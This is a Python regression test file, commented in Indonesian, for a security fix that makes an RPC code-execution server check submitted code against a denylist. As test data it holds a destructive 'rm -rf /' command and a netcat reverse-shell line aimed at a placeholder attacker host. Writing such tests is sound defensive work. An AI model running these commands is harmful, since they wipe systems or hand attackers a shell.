"""Regression tests — WU-010: `ExecuteRpcServer` validasi konten nyata (NET-02).

Bug asli: `execute()` memanggil `self.perms.check_command("execute",
required_mode=STANDARD_TESTING)` -- STRING DUMMY "execute", BUKAN `req["code"]`
yang benar-benar akan ditulis ke file dan dieksekusi via `python3 script.py`.
Konten `code` (Python arbitrer) tidak pernah diperiksa sama sekali sebelum
WU ini -- siapa pun yang bisa membuat request valid (scope+mode lolos) bisa
menjalankan kode apa pun tanpa gate denylist/high-risk-pattern sama sekali.

Verifikasi reachability (PENTING, mengikuti pola revisi severity WU-015):
`ExecuteRpcServer()` diinstansiasi TANPA argumen di `gateway/daemon.py:115`
-- `self.scope = ScopeManager()` (fresh, kosong) dan `self.perms =
PermissionManager()` (default READ_ONLY_RECON) TIDAK PERNAH disinkronkan ke
state orchestrator manapun. Akibatnya: `is_in_scope()` SELALU gagal (scope
kosong) DAN `check_command("execute", ...)` bug asli SELALU deny (string
"execute" tidak pernah ada di allowlist tool manapun kecuali UNRESTRICTED).
Dua efek samping KEBETULAN ini membuat server ini praktis TIDAK REACHABLE
hari ini via jalur yang sudah wired -- bug validasi konten nyata, TAPI bukan
RCE yang aktif dieksploitasi lewat call site yang ada sekarang. Severity:
MEDIUM (landmine defense-in-depth) -- akan jadi HIGH/CRITICAL nyata kalau
scope/perms server ini pernah disinkronkan ke instance nyata di masa depan
tanpa fix ini. Diperbaiki tetap karena murah & benar, bukan diabaikan.
"""

from __future__ import annotations

import os

os.environ.setdefault("WTH_SKIP_SETUP", "1")
os.environ.setdefault("WTH_TEST_MODE", "1")

from wth_ai.models import PermissionMode
from wth_ai.rpc.execute_server import ExecuteRpcServer


def _server_in_scope(mode: PermissionMode = PermissionMode.STANDARD_TESTING) -> ExecuteRpcServer:
    srv = ExecuteRpcServer()
    srv.scope.set_scope(target="example.com", authorized=True, in_scope=["example.com"])
    srv.perms.set_mode(mode)
    return srv


# ---------------------------------------------------------------------------
# Negative -- konten code berbahaya SEKARANG diperiksa (dulu tidak sama sekali)
# ---------------------------------------------------------------------------

def test_denylist_pattern_in_code_blocked():
    srv = _server_in_scope()
    result = srv.execute({"target": "example.com", "code": "import os\nos.system('rm -rf /')\n"})
    assert result["status"] == "blocked"
    assert "denylist" in result["error"].lower()


def test_high_risk_pattern_in_code_blocked():
    srv = _server_in_scope()
    result = srv.execute({
        "target": "example.com",
        "code": "import os\nos.system('nc -e /bin/sh attacker.tld 4444')\n",
    })
    assert result["status"] == "blocked"


def test_code_never_written_to_disk_or_executed_when_denylisted(tmp_path, monkeypatch):
    """Bukti reachability: sink nyata (subprocess.run python3 script.py) TIDAK
    terpanggil sama sekali untuk code yang match denylist."""
    from unittest.mock import MagicMock, patch

    srv = _server_in_scope()
    with patch("subprocess.run") as mock_run:
        result = srv.execute({"target": "example.com", "code": "os.system('rm -rf /')"})
    assert result["status"] == "blocked"
    mock_run.assert_not_called()


# ---------------------------------------------------------------------------
# Positive/compatibility -- code aman tetap dieksekusi seperti sebelumnya
# ---------------------------------------------------------------------------

def test_benign_code_still_executes():
    srv = _server_in_scope()
    result = srv.execute({"target": "example.com", "code": "print('hello')"})
    assert result["status"] == "success"
    assert "hello" in result["stdout"]


# ---------------------------------------------------------------------------
# mode_sufficient() menggantikan check_command("execute", ...) yang cacat
# ---------------------------------------------------------------------------

def test_read_only_mode_still_blocked_after_fix():
    """Compatibility: mode di bawah STANDARD_TESTING tetap blocked -- fix
    hanya mengganti MEKANISME (mode_sufficient vs dummy check_command), bukan
    hasil akhirnya untuk mode insufficient."""
    srv = _server_in_scope(PermissionMode.READ_ONLY_RECON)
    result = srv.execute({"target": "example.com", "code": "print(1)"})
    assert result["status"] == "blocked"
    assert "Insufficient permission" in result["error"]


def test_standard_mode_now_actually_permitted():
    """REGRESI-GUARD utama WU-010: sebelumnya check_command("execute", ...)
    SELALU deny di mode manapun kecuali UNRESTRICTED (karena "execute" bukan
    nama tool nyata) -- STANDARD_TESTING seharusnya cukup per acceptance
    criteria asli (`required_mode=PermissionMode.STANDARD_TESTING`), sekarang
    benar-benar berfungsi sesuai maksud aslinya."""
    srv = _server_in_scope(PermissionMode.STANDARD_TESTING)
    result = srv.execute({"target": "example.com", "code": "print('ok')"})
    assert result["status"] == "success"


def test_unrestricted_mode_still_permitted():
    srv = _server_in_scope(PermissionMode.UNRESTRICTED)
    result = srv.execute({"target": "example.com", "code": "print('ok')"})
    assert result["status"] == "success"


# ---------------------------------------------------------------------------
# Reachability landmine -- server default (tanpa scope/perms disetel) TETAP
# fail-closed, konsisten dengan catatan di atas
# ---------------------------------------------------------------------------

def test_default_unconfigured_server_still_fails_closed():
    srv = ExecuteRpcServer()
    result = srv.execute({"target": "example.com", "code": "print(1)"})
    assert result["status"] == "blocked"
